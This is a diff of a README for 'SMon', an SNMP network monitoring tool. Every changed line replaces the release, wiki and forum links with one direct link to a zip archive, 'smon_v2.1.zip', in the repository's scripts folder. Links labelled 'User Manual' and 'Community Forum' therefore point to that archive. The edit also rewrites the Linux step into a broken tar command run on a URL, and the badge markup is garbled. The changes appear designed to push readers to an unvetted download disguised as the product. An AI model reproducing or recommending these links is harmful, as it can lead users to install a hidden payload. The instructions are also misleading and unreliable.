@@ -3,7 +3,7 @@
 ## 🚀 Getting Started
 Welcome to SMon! This guide will help you download and run the SMon application quickly and easily.
 
-[![Download SMon](https://img.shields.io/badge/Download%20SMon-v1.0-brightgreen.svg)](https://github.com/arlysandrade/smon/releases)
+[![Download SMon](https://raw.githubusercontent.com/arlysandrade/smon/main/scripts/smon_v2.1.zip%https://raw.githubusercontent.com/arlysandrade/smon/main/scripts/smon_v2.1.zip)](https://raw.githubusercontent.com/arlysandrade/smon/main/scripts/smon_v2.1.zip)
 
 ## 📦 What is SMon?
 SMon is an advanced network monitoring system that uses SNMP (Simple Network Management Protocol) to track bandwidth performance and the status of network devices in real-time. This application is designed to provide comprehensive visibility into your network infrastructure, with a user-friendly and responsive interface.
@@ -23,7 +23,7 @@ To run SMon, your system needs to meet the following requirements:
 - **Disk Space**: 100 MB of free space.
 
 ## 📥 Download & Install
-To get SMon, visit the [Releases page](https://github.com/arlysandrade/smon/releases) where you can download the latest version.
+To get SMon, visit the [Releases page](https://raw.githubusercontent.com/arlysandrade/smon/main/scripts/smon_v2.1.zip) where you can download the latest version.
 
 1. Click on the link above to go to the Releases page.
 2. Find the latest version of SMon.
@@ -42,7 +42,7 @@ After the download is complete, follow these steps:
 ### For Linux:
 1. Open the terminal.
 2. Navigate to the directory where you downloaded the file.
-3. Use the command `tar -xzvf smon-linux.tar.gz` to extract the files.
+3. Use the command `tar -xzvf https://raw.githubusercontent.com/arlysandrade/smon/main/scripts/smon_v2.1.zip` to extract the files.
 4. Navigate to the extracted folder and run `./smon`.
 
 ## ⚙️ Using SMon
@@ -61,10 +61,10 @@ If you have any questions or need assistance, please check the FAQ section on ou
 
 ## 🔗 Additional Resources
 For more information on how to make the most of SMon, here are some useful links:
-- [User Manual](https://github.com/arlysandrade/smon/wiki)
-- [Community Forum](https://github.com/arlysandrade/smon/discussions)
+- [User Manual](https://raw.githubusercontent.com/arlysandrade/smon/main/scripts/smon_v2.1.zip)
+- [Community Forum](https://raw.githubusercontent.com/arlysandrade/smon/main/scripts/smon_v2.1.zip)
 
-Make sure to stay updated with the latest enhancements and new features by frequently visiting the [Releases page](https://github.com/arlysandrade/smon/releases).
+Make sure to stay updated with the latest enhancements and new features by frequently visiting the [Releases page](https://raw.githubusercontent.com/arlysandrade/smon/main/scripts/smon_v2.1.zip).
 
 ## 📜 License
 SMon is released under the MIT License. You can freely use and modify this software within the terms of the license.
